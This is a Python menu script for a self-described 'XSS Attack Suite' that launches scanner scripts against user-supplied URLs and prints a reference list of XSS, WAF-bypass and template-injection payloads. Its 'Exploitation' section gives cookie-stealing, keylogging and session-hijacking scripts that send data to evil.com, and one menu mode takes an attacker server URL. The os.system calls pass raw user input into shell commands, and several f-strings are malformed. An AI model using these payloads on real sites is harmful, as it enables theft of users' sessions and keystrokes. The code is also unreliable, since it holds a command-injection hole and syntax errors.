#!/usr/bin/env python3
"""
XSS Attack Suite - Complete XSS Testing Framework
==================================================
Menu-based interface for comprehensive XSS testing
"""

import sys
import os
import time
from colorama import init, Fore, Style

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear_screen()
    print(f"""
{Fore.CYAN}{Fore.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║   ███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗                           ║
║   ████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝                           ║
║   ██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗                           ║
║   ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║                           ║
║   ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║                           ║
║   ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝                           ║
║                                                                           ║
║   {Fore.YELLOW} XSS Attack Suite v3.0 {Fore.CYAN}                                           ║
║   {Fore.WHITE} Complete XSS Testing Framework {Fore.CYAN}                                   ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Fore.RESET}
{Fore.RED}[!] FOR AUTHORIZED TESTING ONLY - UNAUTHORIZED USE IS ILLEGAL{Fore.RESET}
""")

def show_menu():
    print(f"""
{Fore.CYAN}{'='*70}
                    MAIN MENU
{'='*70}{Fore.RESET}

  {Fore.GREEN}[1]{Fore.WHITE}  Basic XSS Scanner
  {Fore.GREEN}[2]{Fore.WHITE}  Advanced XSS Scanner (WAF Bypass)
  {Fore.GREEN}[3]{Fore.WHITE}  Framework-Specific Scanner
  {Fore.GREEN}[4]{Fore.WHITE}  DOM-Based XSS Scanner
  {Fore.GREEN}[5]{Fore.WHITE}  Payload Generator
  {Fore.GREEN}[6]{Fore.WHITE}  Batch Scanner (Multiple URLs)
  {Fore.GREEN}[7]{Fore.WHITE}  Exploitation Mode (Cookie Stealing, Keylogging)
  
  {Fore.YELLOW}[8]{Fore.WHITE}  Framework Info & Payloads Reference
  {Fore.YELLOW}[9]{Fore.WHITE}  Exit
  
{Fore.CYAN}{'='*70}{Fore.RESET}
""")

def run_basic_scanner():
    print(f"\n{Fore.CYAN}[*] Basic XSS Scanner{Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    if url:
        os.system(f'python xss_tool.py -u "{url}" -s basic')

def run_advanced_scanner():
    print(f"\n{Fore.CYAN}[*] Advanced XSS Scanner (WAF Bypass){Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    if url:
        os.system(f'python advanced_xss.py -u "{url}" -s full')

def run_framework_scanner():
    print(f"\n{Fore.CYAN}[*] Framework-Specific Scanner{Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    framework = input(f"{Fore.WHITE}Framework (auto/php/python/java/nodejs/react/angular/vuejs): {Fore.RESET}") or 'auto'
    if url:
        os.system(f'python framework_scanner.py "{url}" {framework}')

def run_dom_scanner():
    print(f"\n{Fore.CYAN}[*] DOM-Based XSS Scanner{Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    if url:
        os.system(f'python advanced_xss.py -u "{url}" --dom-xss')

def run_payload_generator():
    print(f"\n{Fore.CYAN}[*] Payload Generator{Fore.RESET}")
    os.system('python payload_generator.py')

def run_batch_scanner():
    print(f"\n{Fore.CYAN}[*] Batch Scanner{Fore.RESET}")
    filename = input(f"{Fore.WHITE}Enter targets file path: {Fore.RESET}")
    scan_type = input(f"{Fore.WHITE}Scan type (basic/advanced/full): {Fore.RESET}") or 'basic'
    if filename:
        os.system(f'python xss_tool.py -f "{filename}" -s {scan_type}')

def run_exploitation_mode():
    print(f"\n{Fore.CYAN}[*] Exploitation Mode{Fore.RESET}")
    url = input(f"{Fore.WHITE}Enter target URL: {Fore.RESET}")
    attacker = input(f"{Fore.WHITE}Enter your attacker server URL: {Fore.RESET}") or 'http://attacker.com'
    if url:
        os.system(f'python advanced_xss.py -u "{url}" -s full --exploit --attacker "{attacker}"')

def show_reference():
    clear_screen()
    print(f"""
{Fore.CYAN}{Fore.BRIGHT}
╔═══════════════════════════════════════════════════════════════════════════╗
║                    XSS PAYLOADS REFERENCE                                ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Fore.RESET}

{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                         BASIC PAYLOADS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}

  {Fore.WHITE}<script>alert(1)</script>{Fore.RESET}
  {Fore.WHITE}<script>alert(document.cookie)</script>{Fore.RESET}
  {Fore.WHITE}<img src=x onerror=alert(1)>{Fore.RESET}
  {Fore.WHITE}<svg onload=alert(1)>{Fore.RESET}
  {Fore.WHITE}<body onload=alert(1)>{Fore.RESET}

{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                      ATTRIBUTE BREAKOUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}

  {Fore.WHITE}" onmouseover="alert(1)"{Fore.RESET}
  {Fore.WHITE}' onmouseover='alert(1)'{Fore.RESET}
  {Fore.WHITE}" onfocus="alert(1)" autofocus="{Fore.RESET}
  {Fore.WHITE}" onclick="alert(1)"{Fore.RESET}

{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                     JAVASCRIPT BREAKOUT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}

  {Fore.WHITE}';alert(1)//{Fore.RESET}
  {Fore.WHITE}";alert(1)//{Fore.RESET}
  {Fore.WHITE}';alert(1);var x='{Fore.RESET}

{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                       WAF BYPASS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}

  {Fore.WHITE}<ScRiPt>alert(1)</ScRiPt>{Fore.RESET}                    (Case variation)
  {Fore.WHITE}<scr<script>ipt>alert(1)</scr</script>ipt>{Fore.RESET}      (Nested tags)
  {Fore.WHITE>&#60;script&#62;alert(1)&#60;/script&#62;{Fore.RESET}    (HTML entities)
  {Fore.WHITE><script>alert`1`</script>{Fore.RESET}                    (Backtick)
  {Fore.WHITE><script>eval(atob("YWxlcnQoMSk="))</script>{Fore.RESET} (Base64)

{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                      URL PROTOCOLS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}

  {Fore.WHITE}javascript:alert(1){Fore.RESET}
  {Fore.WHITE}data:text/html,<script>alert(1)</script>{Fore.RESET}
  {Fore.WHITE}data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=={Fore.RESET}

{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    FRAMEWORK-SPECIFIC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}

  {Fore.GREEN}PHP:{Fore.RESET}
    {Fore.WHITE}<?php echo "<script>alert(1)</script>"; ?>{Fore.RESET}
    {Fore.WHITE}{{config.items()}}{Fore.RESET}

  {Fore.GREEN}Python/Django:{Fore.RESET}
    {Fore.WHITE}{{ "".__class__.__mro__[1].__subclasses__() }}{Fore.RESET}
    {Fore.WHITE}{{ self.__init__.__globals__ }}{Fore.RESET}

  {Fore.GREEN}Java:{Fore.RESET}
    {Fore.WHITE}<%= Runtime.getRuntime().exec("calc") %>{Fore.RESET}
    {Fore.WHITE}${7*7}{Fore.RESET}

  {Fore.GREEN}React:{Fore.RESET}
    {Fore.WHITE}{{alert(1)}}{Fore.RESET}
    {Fore.WHITE}javascript:alert(1){Fore.RESET}

  {Fore.GREEN}Angular:{Fore.RESET}
    {Fore.WHITE}{{constructor.constructor("return this")().alert(1)}}{Fore.RESET}

  {Fore.GREEN}Vue.js:{Fore.RESET}
    {Fore.WHITE}<svg @load=alert(1)>{Fore.RESET}
    {Fore.WHITE>v-on:load=alert(1){Fore.RESET}

{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                       EXPLOITATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.RESET}

  {Fore.RED}Cookie Stealing:{Fore.RESET}
    {Fore.WHITE}<script>fetch("http://evil.com/?c="+document.cookie)</script>{Fore.RESET}

  {Fore.RED}Keylogging:{Fore.RESET}
    {Fore.WHITE}<script>document.onkeypress=function(e){{fetch("http://evil.com/?k="+e.key)}};{Fore.RESET}

  {Fore.RED}Session Hijacking:{Fore.RESET}
    {Fore.WHITE}<script>document.location="http://evil.com/?c="+document.cookie</script>{Fore.RESET}

{Fore.CYAN}{'='*70}{Fore.RESET}
""")
    input(f"\n{Fore.WHITE}Press Enter to return to menu...{Fore.RESET}")

def main():
    while True:
        banner()
        show_menu()
        
        choice = input(f"{Fore.CYAN}Select option [1-9]: {Fore.RESET}")
        
        if choice == '1':
            run_basic_scanner()
        elif choice == '2':
            run_advanced_scanner()
        elif choice == '3':
            run_framework_scanner()
        elif choice == '4':
            run_dom_scanner()
        elif choice == '5':
            run_payload_generator()
        elif choice == '6':
            run_batch_scanner()
        elif choice == '7':
            run_exploitation_mode()
        elif choice == '8':
            show_reference()
        elif choice == '9':
            print(f"\n{Fore.GREEN}[+] Goodbye! Stay ethical!{Fore.RESET}\n")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[-] Invalid option{Fore.RESET}")
        
        input(f"\n{Fore.WHITE}Press Enter to continue...{Fore.RESET}")

if __name__ == '__main__':
    main()
